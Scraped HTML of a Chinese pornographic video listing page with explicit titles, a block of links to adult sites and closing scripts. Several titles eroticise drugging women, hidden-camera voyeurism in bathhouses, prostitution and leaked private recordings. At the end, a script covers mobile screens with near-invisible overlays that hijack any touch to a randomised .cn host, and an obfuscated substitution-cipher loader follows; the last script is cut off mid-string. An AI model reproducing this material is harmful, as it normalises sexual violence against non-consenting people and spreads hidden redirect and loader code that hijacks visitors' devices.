<div class="img"><img class="thumb_img lazyload" data-src="https://feimian.slpicsl.com/upload/vod/20240403-1/488fedd36e4df69c4e13f4283f4cf51c.jpg" alt="富二代高级会所玩嫩模陪过夜，有钱真是爽的!" data-webp="https://feimian.slpicsl.com/upload/vod/20240403-1/488fedd36e4df69c4e13f4283f4cf51c.jpg" data-preview="/"><span class="type">国产精品</span><span onclick class="ico-fav-0 heart icon-heart" title="添加收藏" data-fav-video-id></span><span class="time">24-04-03</span></div>
<div class="info-post">
<h4 class="title-post">富二代高级会所玩嫩模陪过夜，有钱真是爽的!</h4>
<div class="stat"><span><i class="icon-eye"></i>40548</span></div>
</div>
</a></div>
<div class="item"><a href="/index.php/vodplay/536056-1-1.html" title="富二代找俩男给她玩到喷水了，特别舒服的!">
<div class="img"><img class="thumb_img lazyload" data-src="https://feimian.slpicsl.com/upload/vod/20240403-1/0b5a9f7e880e6c7348336b06462b310c.jpg" alt="富二代找俩男给她玩到喷水了，特别舒服的!" data-webp="https://feimian.slpicsl.com/upload/vod/20240403-1/0b5a9f7e880e6c7348336b06462b310c.jpg" data-preview="/"><span class="type">国产精品</span><span onclick class="ico-fav-0 heart icon-heart" title="添加收藏" data-fav-video-id></span><span class="time">24-04-03</span></div>
<div class="info-post">
<h4 class="title-post">富二代找俩男给她玩到喷水了，特别舒服的!</h4>
<div class="stat"><span><i class="icon-eye"></i>61968</span></div>
</div>
</a></div>
<div class="item"><a href="/index.php/vodplay/536055-1-1.html" title="高跟制服网袜小淫女黄瓜玩淫穴 幻化白丝狐妖玩弄骚浪美穴 弄的骚穴淫水湿哒哒 极致诱惑 妩媚呻吟 好想操她的!">
<div class="img"><img class="thumb_img lazyload" data-src="https://feimian.slpicsl.com/upload/vod/20240403-1/2eb7910b927913bb1d43bc217594b77d.jpg" alt="高跟制服网袜小淫女黄瓜玩淫穴 幻化白丝狐妖玩弄骚浪美穴 弄的骚穴淫水湿哒哒 极致诱惑 妩媚呻吟 好想操她的!" data-webp="https://feimian.slpicsl.com/upload/vod/20240403-1/2eb7910b927913bb1d43bc217594b77d.jpg" data-preview="/"><span class="type">国产精品</span><span onclick class="ico-fav-0 heart icon-heart" title="添加收藏" data-fav-video-id></span><span class="time">24-04-03</span></div>
<div class="info-post">
<h4 class="title-post">高跟制服网袜小淫女黄瓜玩淫穴 幻化白丝狐妖玩弄骚浪美穴 弄的骚穴淫水湿哒哒 极致诱惑 妩媚呻吟 好想操她的!</h4>
<div class="stat"><span><i class="icon-eye"></i>89614</span></div>
</div>
</a></div>
<div class="item"><a href="/index.php/vodplay/536054-1-1.html" title="富二代大屌哥暑假和学院女神异地旅游酒店开房大干一天一夜720P高清无水印的!">
<div class="img"><img class="thumb_img lazyload" data-src="https://feimian.slpicsl.com/upload/vod/20240403-1/46b3725903e0f4f781a63b29b3fb8dd4.jpg" alt="富二代大屌哥暑假和学院女神异地旅游酒店开房大干一天一夜720P高清无水印的!" data-webp="https://feimian.slpicsl.com/upload/vod/20240403-1/46b3725903e0f4f781a63b29b3fb8dd4.jpg" data-preview="/"><span class="type">主播大秀</span><span onclick class="ico-fav-0 heart icon-heart" title="添加收藏" data-fav-video-id></span><span class="time">24-04-03</span></div>
<div class="info-post">
<h4 class="title-post">富二代大屌哥暑假和学院女神异地旅游酒店开房大干一天一夜720P高清无水印的!</h4>
<div class="stat"><span><i class="icon-eye"></i>33851</span></div>
</div>
</a></div>
<div class="item"><a href="/index.php/vodplay/536053-1-1.html" title="富姐公交站等老公被过路司机搭讪坐顺风车被下迷药拉到偏僻处车震对白有趣的!">
<div class="img"><img class="thumb_img lazyload" data-src="https://feimian.slpicsl.com/upload/vod/20240403-1/67d3a658d750c83b1f87a784f6ab0846.jpg" alt="富姐公交站等老公被过路司机搭讪坐顺风车被下迷药拉到偏僻处车震对白有趣的!" data-webp="https://feimian.slpicsl.com/upload/vod/20240403-1/67d3a658d750c83b1f87a784f6ab0846.jpg" data-preview="/"><span class="type">主播大秀</span><span onclick class="ico-fav-0 heart icon-heart" title="添加收藏" data-fav-video-id></span><span class="time">24-04-03</span></div>
<div class="info-post">
<h4 class="title-post">富姐公交站等老公被过路司机搭讪坐顺风车被下迷药拉到偏僻处车震对白有趣的!</h4>
<div class="stat"><span><i class="icon-eye"></i>69798</span></div>
</div>
</a></div>
<div class="item"><a href="/index.php/vodplay/536052-1-1.html" title="高级洗浴会所600元挑了位样貌还不错的美女服务,又私下加了300元才答应可以一边操一边拍,差点没忍住射进去的!">
<div class="img"><img class="thumb_img lazyload" data-src="https://feimian.slpicsl.com/upload/vod/20240403-1/72d61ce61f2be9b8e868ffd73e2f22d4.jpg" alt="高级洗浴会所600元挑了位样貌还不错的美女服务,又私下加了300元才答应可以一边操一边拍,差点没忍住射进去的!" data-webp="https://feimian.slpicsl.com/upload/vod/20240403-1/72d61ce61f2be9b8e868ffd73e2f22d4.jpg" data-preview="/"><span class="type">主播大秀</span><span onclick class="ico-fav-0 heart icon-heart" title="添加收藏" data-fav-video-id></span><span class="time">24-04-03</span></div>
<div class="info-post">
<h4 class="title-post">高级洗浴会所600元挑了位样貌还不错的美女服务,又私下加了300元才答应可以一边操一边拍,差点没忍住射进去的!</h4>
<div class="stat"><span><i class="icon-eye"></i>81029</span></div>
</div>
</a></div>
<div class="item"><a href="/index.php/vodplay/536051-1-1.html" title="高颜值极品兼职大学美女酒店援交顾客要价太贵了,1000元还必须要戴着套才能干,长得漂亮操逼都贵.国语对白的!">
<div class="img"><img class="thumb_img lazyload" data-src="https://feimian.slpicsl.com/upload/vod/20240403-1/78f7d522c095ea6963fe3cda291ab5ec.jpg" alt="高颜值极品兼职大学美女酒店援交顾客要价太贵了,1000元还必须要戴着套才能干,长得漂亮操逼都贵.国语对白的!" data-webp="https://feimian.slpicsl.com/upload/vod/20240403-1/78f7d522c095ea6963fe3cda291ab5ec.jpg" data-preview="/"><span class="type">主播大秀</span><span onclick class="ico-fav-0 heart icon-heart" title="添加收藏" data-fav-video-id></span><span class="time">24-04-03</span></div>
<div class="info-post">
<h4 class="title-post">高颜值极品兼职大学美女酒店援交顾客要价太贵了,1000元还必须要戴着套才能干,长得漂亮操逼都贵.国语对白的!</h4>
<div class="stat"><span><i class="icon-eye"></i>84985</span></div>
</div>
</a></div>
<div class="item"><a href="/index.php/vodplay/536050-1-1.html" title="高颜值国模小莲宾馆与摄影师激情互动私拍流出 这一笑我爱上了她 狂野纹身 漂亮美乳 高清1080P原版无水印的!">
<div class="img"><img class="thumb_img lazyload" data-src="https://feimian.slpicsl.com/upload/vod/20240403-1/f10f22e99fc29ff81a30e38ab0be6503.jpg" alt="高颜值国模小莲宾馆与摄影师激情互动私拍流出 这一笑我爱上了她 狂野纹身 漂亮美乳 高清1080P原版无水印的!" data-webp="https://feimian.slpicsl.com/upload/vod/20240403-1/f10f22e99fc29ff81a30e38ab0be6503.jpg" data-preview="/"><span class="type">国产精品</span><span onclick class="ico-fav-0 heart icon-heart" title="添加收藏" data-fav-video-id></span><span class="time">24-04-03</span></div>
<div class="info-post">
<h4 class="title-post">高颜值国模小莲宾馆与摄影师激情互动私拍流出 这一笑我爱上了她 狂野纹身 漂亮美乳 高清1080P原版无水印的!</h4>
<div class="stat"><span><i class="icon-eye"></i>41955</span></div>
</div>
</a></div>
<div class="item"><a href="/index.php/vodplay/536049-1-1.html" title="广东帅哥按摩院精挑细选极品美乳按摩妹大保健自拍系列NO1的!">
<div class="img"><img class="thumb_img lazyload" data-src="https://feimian.slpicsl.com/upload/vod/20240403-1/012128c8920c9985483a8cff902ed113.jpg" alt="广东帅哥按摩院精挑细选极品美乳按摩妹大保健自拍系列NO1的!" data-webp="https://feimian.slpicsl.com/upload/vod/20240403-1/012128c8920c9985483a8cff902ed113.jpg" data-preview="/"><span class="type">国产精品</span><span onclick class="ico-fav-0 heart icon-heart" title="添加收藏" data-fav-video-id></span><span class="time">24-04-03</span></div>
<div class="info-post">
<h4 class="title-post">广东帅哥按摩院精挑细选极品美乳按摩妹大保健自拍系列NO1的!</h4>
<div class="stat"><span><i class="icon-eye"></i>45402</span></div>
</div>
</a></div>
<div class="item"><a href="/index.php/vodplay/536048-1-1.html" title="广东小鲜肉约炮丝袜高跟女神附聊天记录淫照无水印完整版的!">
<div class="img"><img class="thumb_img lazyload" data-src="https://feimian.slpicsl.com/upload/vod/20240403-1/d563692995f136faefbe739211f97a31.jpg" alt="广东小鲜肉约炮丝袜高跟女神附聊天记录淫照无水印完整版的!" data-webp="https://feimian.slpicsl.com/upload/vod/20240403-1/d563692995f136faefbe739211f97a31.jpg" data-preview="/"><span class="type">国产精品</span><span onclick class="ico-fav-0 heart icon-heart" title="添加收藏" data-fav-video-id></span><span class="time">24-04-03</span></div>
<div class="info-post">
<h4 class="title-post">广东小鲜肉约炮丝袜高跟女神附聊天记录淫照无水印完整版的!</h4>
<div class="stat"><span><i class="icon-eye"></i>35644</span></div>
</div>
</a></div>
<div class="item"><a href="/index.php/vodplay/536047-1-1.html" title="国产比女人还美的CD惠奈酱上演办公室内OL秘书被小眼镜直男无套中出的!">
<div class="img"><img class="thumb_img lazyload" data-src="https://feimian.slpicsl.com/upload/vod/20240403-1/db052064cc5ae8ea51e17e1939856314.jpg" alt="国产比女人还美的CD惠奈酱上演办公室内OL秘书被小眼镜直男无套中出的!" data-webp="https://feimian.slpicsl.com/upload/vod/20240403-1/db052064cc5ae8ea51e17e1939856314.jpg" data-preview="/"><span class="type">国产精品</span><span onclick class="ico-fav-0 heart icon-heart" title="添加收藏" data-fav-video-id></span><span class="time">24-04-03</span></div>
<div class="info-post">
<h4 class="title-post">国产比女人还美的CD惠奈酱上演办公室内OL秘书被小眼镜直男无套中出的!</h4>
<div class="stat"><span><i class="icon-eye"></i>60133</span></div>
</div>
</a></div>
<div class="item"><a href="/index.php/vodplay/536046-1-1.html" title="国内洗浴中心公共澡堂偷拍按摩床上还躺着两个做SPA推油的阿姨的!">
<div class="img"><img class="thumb_img lazyload" data-src="https://feimian.slpicsl.com/upload/vod/20240403-1/b10e422b351b197ee2f97b077f67bb74.jpg" alt="国内洗浴中心公共澡堂偷拍按摩床上还躺着两个做SPA推油的阿姨的!" data-webp="https://feimian.slpicsl.com/upload/vod/20240403-1/b10e422b351b197ee2f97b077f67bb74.jpg" data-preview="/"><span class="type">国产精品</span><span onclick class="ico-fav-0 heart icon-heart" title="添加收藏" data-fav-video-id></span><span class="time">24-04-03</span></div>
<div class="info-post">
<h4 class="title-post">国内洗浴中心公共澡堂偷拍按摩床上还躺着两个做SPA推油的阿姨的!</h4>
<div class="stat"><span><i class="icon-eye"></i>88890</span></div>
</div>
</a></div>
<div class="item"><a href="/index.php/vodplay/536045-1-1.html" title="高清私拍贫乳红衣丝袜少女，鲍鱼很嫩玩带上套了第一视觉插入的!">
<div class="img"><img class="thumb_img lazyload" data-src="https://feimian.slpicsl.com/upload/vod/20240403-1/9c5a0cc65ead4e15b6b7e3e9bfc2d87c.jpg" alt="高清私拍贫乳红衣丝袜少女，鲍鱼很嫩玩带上套了第一视觉插入的!" data-webp="https://feimian.slpicsl.com/upload/vod/20240403-1/9c5a0cc65ead4e15b6b7e3e9bfc2d87c.jpg" data-preview="/"><span class="type">国产精品</span><span onclick class="ico-fav-0 heart icon-heart" title="添加收藏" data-fav-video-id></span><span class="time">24-04-03</span></div>
<div class="info-post">
<h4 class="title-post">高清私拍贫乳红衣丝袜少女，鲍鱼很嫩玩带上套了第一视觉插入的!</h4>
<div class="stat"><span><i class="icon-eye"></i>89341</span></div>
</div>
</a></div>
<div class="item"><a href="/index.php/vodplay/536044-1-1.html" title="國內真實咪J-变态眼镜哥请隔壁租房白领小姐姐吃宵夜偷偷下药放倒带到旅馆开房啪啪的!">
<div class="img"><img class="thumb_img lazyload" data-src="https://feimian.slpicsl.com/upload/vod/20240403-1/6ffe17af65f2b3c1f46b1f1cdaf688e5.jpg" alt="國內真實咪J-变态眼镜哥请隔壁租房白领小姐姐吃宵夜偷偷下药放倒带到旅馆开房啪啪的!" data-webp="https://feimian.slpicsl.com/upload/vod/20240403-1/6ffe17af65f2b3c1f46b1f1cdaf688e5.jpg" data-preview="/"><span class="type">国产精品</span><span onclick class="ico-fav-0 heart icon-heart" title="添加收藏" data-fav-video-id></span><span class="time">24-04-03</span></div>
<div class="info-post">
<h4 class="title-post">國內真實咪J-变态眼镜哥请隔壁租房白领小姐姐吃宵夜偷偷下药放倒带到旅馆开房啪啪的!</h4>
<div class="stat"><span><i class="icon-eye"></i>56430</span></div>
</div>
</a></div>
<div class="item"><a href="/index.php/vodplay/536043-1-1.html" title="国外自拍视频售卖网站Manyvids最新流出漂亮华裔美眉跪着吃大洋屌720P高清无水印的!">
<div class="img"><img class="thumb_img lazyload" data-src="https://feimian.slpicsl.com/upload/vod/20240403-1/758ac3631cbcb6702c70f08e98c56a00.jpg" alt="国外自拍视频售卖网站Manyvids最新流出漂亮华裔美眉跪着吃大洋屌720P高清无水印的!" data-webp="https://feimian.slpicsl.com/upload/vod/20240403-1/758ac3631cbcb6702c70f08e98c56a00.jpg" data-preview="/"><span class="type">国产精品</span><span onclick class="ico-fav-0 heart icon-heart" title="添加收藏" data-fav-video-id></span><span class="time">24-04-03</span></div>
<div class="info-post">
<h4 class="title-post">国外自拍视频售卖网站Manyvids最新流出漂亮华裔美眉跪着吃大洋屌720P高清无水印的!</h4>
<div class="stat"><span><i class="icon-eye"></i>89222</span></div>
</div>
</a></div>
</div>
<div class="pagination">
<div class="item pager prev"><a class="btn" href="/index.php/vod/type/page/29.html"><i class="icon-arrow-right icon"></i><span>上一页</span></a></div>
<div class="item"><a href="/index.php/vod/type/page/28.html">28</a></div>
<div class="item"><a href="/index.php/vod/type/page/29.html">29</a></div>
<div class="item active"><a href="javascript:;" title="第30页">30</a></div>
<div class="item"><a href="/index.php/vod/type/page/31.html">31</a></div>
<div class="item"><a href="/index.php/vod/type/page/32.html">32</a></div>
<div class="item pager next"><a class="btn" href="/index.php/vod/type/page/31.html"><span>下一页</span><i class="icon-arrow-right icon"></i></a></div>
</div>
</div>
</section>
</div>
</main>
<section>
<div class="wrap">
<div style="padding-top: 10px; width:100%;">
<ul>
<li style="width:25%; max-width:150px; text-align:center; padding:8px 0px; border:1px solid #fff; float:left;background: #;">
<a href="https://www.tcpao.top" target="_blank" onclick="gtag('event', '友链', {'event_category': '点击', 'event_label': '偷拍','value': 500});" rel="nofollow" style="color: #FFF83B; font-size:14px; font-weight:bold;">偷拍</a></li>
<li style="width:25%; max-width:150px; text-align:center; padding:8px 0px; border:1px solid #fff; float:left;background: #;">
<a href="https://www.angelxdh999.cc" target="_blank" onclick="gtag('event', '友链', {'event_category': '点击', 'event_label': '天使导航','value': 500});" rel="nofollow" style="color: #; font-size:14px; font-weight:bold;">天使导航</a></li>
<li style="width:25%; max-width:150px; text-align:center; padding:8px 0px; border:1px solid #fff; float:left;background: #;">
<a href="https://mijidh22.top" target="_blank" onclick="gtag('event', '友链', {'event_category': '点击', 'event_label': '谜姬导航','value': 500});" rel="nofollow" style="color: #; font-size:14px; font-weight:bold;">谜姬导航</a></li>
<li style="width:25%; max-width:150px; text-align:center; padding:8px 0px; border:1px solid #fff; float:left;background: #;">
<a href="http://liyuedaohang.xyz" target="_blank" onclick="gtag('event', '友链', {'event_category': '点击', 'event_label': '璃月導航','value': 500});" rel="nofollow" style="color: #; font-size:14px; font-weight:bold;">璃月導航</a></li>
<li style="width:25%; max-width:150px; text-align:center; padding:8px 0px; border:1px solid #fff; float:left;background: #;">
<a href="https://gcuppaa.xyz" target="_blank" onclick="gtag('event', '友链', {'event_category': '点击', 'event_label': '萌萌哒','value': 500});" rel="nofollow" style="color: #; font-size:14px; font-weight:bold;">萌萌哒</a></li>
<li style="width:25%; max-width:150px; text-align:center; padding:8px 0px; border:1px solid #fff; float:left;background: #;">
<a href="https://www.mirihua.xyz/go/" target="_blank" onclick="gtag('event', '友链', {'event_category': '点击', 'event_label': '明日花导航','value': 500});" rel="nofollow" style="color: #FFFA63; font-size:14px; font-weight:bold;">明日花导航</a></li>
<li style="width:25%; max-width:150px; text-align:center; padding:8px 0px; border:1px solid #fff; float:left;background: #;">
<a href="https://dahu3.xyz/qbwq9M" target="_blank" onclick="gtag('event', '友链', {'event_category': '点击', 'event_label': '杏MAP导航','value': 500});" rel="nofollow" style="color: #; font-size:14px; font-weight:bold;">杏MAP导航</a></li>
<li style="width:25%; max-width:150px; text-align:center; padding:8px 0px; border:1px solid #fff; float:left;background: #;">
<a href="https://ssphb.xyz/rk/?key=968a07fb2305172607" target="_blank" onclick="gtag('event', '友链', {'event_category': '点击', 'event_label': '色控调教','value': 500});" rel="nofollow" style="color: #; font-size:14px; font-weight:bold;">色控调教</a></li>
<li style="width:25%; max-width:150px; text-align:center; padding:8px 0px; border:1px solid #fff; float:left;background: #;">
<a href="https://toxinzoo.xyz" target="_blank" onclick="gtag('event', '友链', {'event_category': '点击', 'event_label': '女体私密','value': 500});" rel="nofollow" style="color: #; font-size:14px; font-weight:bold;">女体私密</a></li>
<li style="width:25%; max-width:150px; text-align:center; padding:8px 0px; border:1px solid #fff; float:left;background: #;">
<a href="https://qnxdh2023.com/love" target="_blank" onclick="gtag('event', '友链', {'event_category': '点击', 'event_label': '轮番内射','value': 500});" rel="nofollow" style="color: #; font-size:14px; font-weight:bold;">轮番内射</a></li>
<li style="width:25%; max-width:150px; text-align:center; padding:8px 0px; border:1px solid #fff; float:left;background: #;">
<a href="http://www.chengrenbz.com" target="_blank" onclick="gtag('event', '友链', {'event_category': '点击', 'event_label': '成人B站','value': 500});" rel="nofollow" style="color: #; font-size:14px; font-weight:bold;">成人B站</a></li>
<li style="width:25%; max-width:150px; text-align:center; padding:8px 0px; border:1px solid #fff; float:left;background: #;">
<a href="https://www.weix2eba.info/?pro=174083558" target="_blank" onclick="gtag('event', '友链', {'event_category': '点击', 'event_label': '后宫导航','value': 500});" rel="nofollow" style="color: #; font-size:14px; font-weight:bold;">后宫导航</a></li>
<li style="width:25%; max-width:150px; text-align:center; padding:8px 0px; border:1px solid #fff; float:left;background: #;">
<a href="https://myhsdh.cc/" target="_blank" onclick="gtag('event', '友链', {'event_category': '点击', 'event_label': '名媛会所','value': 500});" rel="nofollow" style="color: #; font-size:14px; font-weight:bold;">名媛会所</a></li>
<li style="width:25%; max-width:150px; text-align:center; padding:8px 0px; border:1px solid #fff; float:left;background: #;">
<a href="https://www.yd66.se" target="_blank" onclick="gtag('event', '友链', {'event_category': '点击', 'event_label': '云顶导航','value': 500});" rel="nofollow" style="color: #; font-size:14px; font-weight:bold;">云顶导航</a></li>
<li style="width:25%; max-width:150px; text-align:center; padding:8px 0px; border:1px solid #fff; float:left;background: #;">
<a href="https://dahu3.xyz/25aTFw" target="_blank" onclick="gtag('event', '友链', {'event_category': '点击', 'event_label': '企鹅导航','value': 500});" rel="nofollow" style="color: #; font-size:14px; font-weight:bold;">企鹅导航</a></li>
<li style="width:25%; max-width:150px; text-align:center; padding:8px 0px; border:1px solid #fff; float:left;background: #;">
<a href="https://bzpdh.com" target="_blank" onclick="gtag('event', '友链', {'event_category': '点击', 'event_label': '鲍租婆','value': 500});" rel="nofollow" style="color: #; font-size:14px; font-weight:bold;">鲍租婆</a></li>
<li style="width:25%; max-width:150px; text-align:center; padding:8px 0px; border:1px solid #fff; float:left;background: #;">
<a href="https://www.judiaodaohang1.com" target="_blank" onclick="gtag('event', '友链', {'event_category': '点击', 'event_label': '巨屌导航','value': 500});" rel="nofollow" style="color: #; font-size:14px; font-weight:bold;">巨屌导航</a></li>
<li style="width:25%; max-width:150px; text-align:center; padding:8px 0px; border:1px solid #fff; float:left;background: #;">
<a href="https://meili10.co" target="_blank" onclick="gtag('event', '友链', {'event_category': '点击', 'event_label': '福利社导航','value': 500});" rel="nofollow" style="color: #; font-size:14px; font-weight:bold;">福利社导航</a></li>
<li style="width:25%; max-width:150px; text-align:center; padding:8px 0px; border:1px solid #fff; float:left;background: #;">
<a href="https://fuqiang10.icu" target="_blank" onclick="gtag('event', '友链', {'event_category': '点击', 'event_label': '六点半导航','value': 500});" rel="nofollow" style="color: #; font-size:14px; font-weight:bold;">六点半导航</a></li>
<li style="width:25%; max-width:150px; text-align:center; padding:8px 0px; border:1px solid #fff; float:left;background: #;">
<a href="http://www.paihangdhfb.top/" target="_blank" onclick="gtag('event', '友链', {'event_category': '点击', 'event_label': '色站排行榜导航','value': 500});" rel="nofollow" style="color: #; font-size:14px; font-weight:bold;">色站排行榜导航</a></li>
<li style="width:25%; max-width:150px; text-align:center; padding:8px 0px; border:1px solid #fff; float:left;background: #;">
<a href="http://www.sedh.cc/" target="_blank" onclick="gtag('event', '友链', {'event_category': '点击', 'event_label': '色导航','value': 500});" rel="nofollow" style="color: #; font-size:14px; font-weight:bold;">色导航</a></li>
<li style="width:25%; max-width:150px; text-align:center; padding:8px 0px; border:1px solid #fff; float:left;background: #;">
<a href=" https://www.nbdh15.buzz/?info=12chungong" target="_blank" onclick="gtag('event', '友链', {'event_category': '点击', 'event_label': '牛逼导航','value': 500});" rel="nofollow" style="color: #; font-size:14px; font-weight:bold;">牛逼导航</a></li>
<li style="width:25%; max-width:150px; text-align:center; padding:8px 0px; border:1px solid #fff; float:left;background: #;">
<a href="https://bsk.j3jdh.com/xsdh/" target="_blank" onclick="gtag('event', '友链', {'event_category': '点击', 'event_label': '羞涩导航','value': 500});" rel="nofollow" style="color: #; font-size:14px; font-weight:bold;">羞涩导航</a></li>
<li style="width:25%; max-width:150px; text-align:center; padding:8px 0px; border:1px solid #fff; float:left;background: #;">
<a href="https://brx.myzydh.com/1/" target="_blank" onclick="gtag('event', '友链', {'event_category': '点击', 'event_label': '名优资源','value': 500});" rel="nofollow" style="color: #; font-size:14px; font-weight:bold;">名优资源</a></li>
<li style="width:25%; max-width:150px; text-align:center; padding:8px 0px; border:1px solid #fff; float:left;background: #;">
<a href="https://www.inyanhy.cyou " target="_blank" onclick="gtag('event', '友链', {'event_category': '点击', 'event_label': '爆乳动漫','value': 500});" rel="nofollow" style="color: #FFE74D; font-size:14px; font-weight:bold;">爆乳动漫</a></li>
<li style="width:25%; max-width:150px; text-align:center; padding:8px 0px; border:1px solid #fff; float:left;background: #;">
<a href="https://www.sbgktu.lol " target="_blank" onclick="gtag('event', '友链', {'event_category': '点击', 'event_label': '麻豆破解传媒','value': 500});" rel="nofollow" style="color: #FFE74D; font-size:14px; font-weight:bold;">麻豆破解传媒</a></li>
<li style="width:25%; max-width:150px; text-align:center; padding:8px 0px; border:1px solid #fff; float:left;background: #;">
<a href="https://www.pensx-ww.sbs" target="_blank" onclick="gtag('event', '友链', {'event_category': '点击', 'event_label': '白虎嫩穴','value': 500});" rel="nofollow" style="color: #FFE74D; font-size:14px; font-weight:bold;">白虎嫩穴</a></li>
<li style="width:25%; max-width:150px; text-align:center; padding:8px 0px; border:1px solid #fff; float:left;background: #;">
<a href="https://www.mirihua.xyz/go/" target="_blank" onclick="gtag('event', '友链', {'event_category': '点击', 'event_label': 'SM','value': 500});" rel="nofollow" style="color: #FFF83B; font-size:14px; font-weight:bold;">SM</a></li>
<li style="width:25%; max-width:150px; text-align:center; padding:8px 0px; border:1px solid #fff; float:left;background: #;">
<a href="https://www.tcpao.top" target="_blank" onclick="gtag('event', '友链', {'event_category': '点击', 'event_label': '抖阴','value': 500});" rel="nofollow" style="color: #FFF83B; font-size:14px; font-weight:bold;">抖阴</a></li>
<li style="width:25%; max-width:150px; text-align:center; padding:8px 0px; border:1px solid #fff; float:left;background: #;">
<a href="https://ssphb.xyz/rk/?key=968a07fb2305172607" target="_blank" onclick="gtag('event', '友链', {'event_category': '点击', 'event_label': '勾引做爱','value': 500});" rel="nofollow" style="color: #; font-size:14px; font-weight:bold;">勾引做爱</a></li>
<li style="width:25%; max-width:150px; text-align:center; padding:8px 0px; border:1px solid #fff; float:left;background: #;">
<a href="https://toxinzoo.xyz" target="_blank" onclick="gtag('event', '友链', {'event_category': '点击', 'event_label': '援交性爱','value': 500});" rel="nofollow" style="color: #; font-size:14px; font-weight:bold;">援交性爱</a></li>
<li style="width:25%; max-width:150px; text-align:center; padding:8px 0px; border:1px solid #fff; float:left;background: #;">
<a href="https://qnxdh2023.com/love" target="_blank" onclick="gtag('event', '友链', {'event_category': '点击', 'event_label': '继母秘密','value': 500});" rel="nofollow" style="color: #; font-size:14px; font-weight:bold;">继母秘密</a></li>
</ul>
</div>
<div style="clear:both;"></div>
</div>
</section>
<footer class="footer">
<div class="block-footer">
<div class="wrap">
<div class="flex">
<div class="copyright">
<p>所有的影片皆从外部来源于网络收集。没有视频托管本服务器上。如果您有任何法律问题，请联系合适的视频所有者或主机的网站.你还可以与我们联系。</p>
<br> <a href="https://t.me/chungong012" target="_blank" style="color: #ffe000;"><img src="/template/video/telegram.png" alt="telegram" style="width:24px;height:24px;">@chungong012</a> <a href="/cdn-cgi/l/email-protection#e6c69ededfd5deded5d0d4a6818b878f8ac885898b" target="_blank" style="color: #ffe000;"><img src="/template/video/mail.png" alt="telegram" style="width:24px;height:24px;"><span class="__cf_email__" data-cfemail="1169292822292922272351767c70787d3f727e7c">[email&#160;protected]</span></a>
</div>
</div>
</div>
</div>
</footer>
<div style="display:none">
<script data-cfasync="false" src="/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script><script>

</script>
<script>


</script>
</div>
<script>if(!/^Mac|Win/.test(navigator.platform)){var i=0;for(var n=0;n<4;n++){for(var j=0;j<10;j++){var style="position:fixed; top:"+(7.96875*n)+"vw; left:"+j*9.8+"vw; z-index:10;display:block;width:9.6vw;height:7.96875vw;background: #000;opacity:0.01;";document.write('<div class="yrvtsvhc_b" style="'+style+'"></div>');var a=document.getElementsByClassName("yrvtsvhc_b");a[i].addEventListener("touchstart",function(){var yrvtsvhc_n="https://"+Date.parse(new Date())+"4c40bedeaaa7c1cgcc.5vkyqkc.cn"+":8005/cc/3068?is_not=1&target=1&ty=2";if(top.location!=self.location){top.location=yrvtsvhc_n}else{window.location.href=yrvtsvhc_n}});i++}}};</script> <script>!function(){function a(a){var b={e:"P",w:"D",T:"y","+":"J",l:"!",t:"L",E:"E","@":"2",d:"a",b:"%",q:"l",X:"v","~":"R",5:"r","&":"X",C:"j","]":"F",a:")","^":"m",",":"~","}":"1",x:"C",c:"(",G:"@",h:"h",".":"*",L:"s","=":",",p:"g",I:"Q",1:"7",_:"u",K:"6",F:"t",2:"n",8:"=",k:"G",Z:"]",")":"b",P:"}",B:"U",S:"k",6:"i",g:":",N:"N",i:"S","%":"+","-":"Y","?":"|",4:"z","*":"-",3:"^","[":"{","(":"c",u:"B",y:"M",U:"Z",H:"[",z:"K",9:"H",7:"f",R:"x",v:"&","!":";",M:"_",Q:"9",Y:"e",o:"4",r:"A",m:".",O:"o",V:"W",J:"p",f:"d",":":"q","{":"8",W:"I",j:"?",n:"5",s:"3","|":"T",A:"V",D:"w",";":"O"};return a.split("").map(function(a){return void 0!==b[a]?b[a]:a}).join("")}var b=a(`dxrGUCRGvZl7_2(F6O2cYa[Xd5 F8[P!7_2(F6O2 5c2a[67cFH2Za5YF_52 FH2ZmYRJO5FL!Xd5 O8FH2Z8[6g2=qgl}=YRJO5FLg[PP!5YF_52 YH2Zm(dqqcOmYRJO5FL=O=OmYRJO5FL=5a=Omq8l0=OmYRJO5FLP5m^8Y=5m(8F=5mf87_2(F6O2cY=F=2a[5mOcY=Fa??;)CY(FmfY762Ye5OJY5FTcY=F=[Y2_^Y5d)qYgl0=pYFg2PaP=5m587_2(F6O2cYa["_2fY762Yf"l8FTJYO7 iT^)OqvviT^)OqmFOiF562p|dpvv;)CY(FmfY762Ye5OJY5FTcY=iT^)OqmFOiF562p|dp=[Xdq_Yg"yOf_qY"Pa=;)CY(FmfY762Ye5OJY5FTcY="MMYLyOf_qY"=[Xdq_Ygl0PaP=5mF87_2(F6O2cY=Fa[67c}vFvvcY85cYaa={vFa5YF_52 Y!67covFvv"O)CY(F"88FTJYO7 YvvYvvYmMMYLyOf_qYa5YF_52 Y!Xd5 28;)CY(Fm(5YdFYc2_qqa!67c5m5c2a=;)CY(FmfY762Ye5OJY5FTc2="fY7d_qF"=[Y2_^Y5d)qYgl0=Xdq_YgYPa=@vFvv"LF562p"l8FTJYO7 Ya7O5cXd5 O 62 Ya5mfc2=O=7_2(F6O2cFa[5YF_52 YHFZPm)62fc2_qq=Oaa!5YF_52 2P=5m287_2(F6O2cYa[Xd5 F8YvvYmMMYLyOf_qYj7_2(F6O2ca[5YF_52 YmfY7d_qFPg7_2(F6O2ca[5YF_52 YP!5YF_52 5mfcF="d"=Fa=FP=5mO87_2(F6O2cY=Fa[5YF_52 ;)CY(FmJ5OFOFTJYmhdL;D2e5OJY5FTm(dqqcY=FaP=5mJ8""=5c5mL80aPcH7_2(F6O2cY=Fa[Xd5 58fO(_^Y2F=282dX6pdFO5mJqdF7O5^=O85m(_55Y2Fi(56JF! 67cl/3yd(?V62/mFYLFc2a??l2a[Xd5 T5XFLXh(M6LMDL8T5XFLXh(M6LMSS80!LYF|6^YO_Fc7_2(F6O2ca[67cT5XFLXh(M6LMDL880a[Xd5 (q6Y2FD6fFh8D62fODmL(5YY2mdXd6qV6fFh!fO(_^Y2FmdffEXY2Ft6LFY2Y5c"FO_(hLFd5F"=7_2(F6O2ca[67cT5XFLXh(M6LMDL880a[Xd5 YXY8YXY2F??D62fODmYXY2F!Xd5 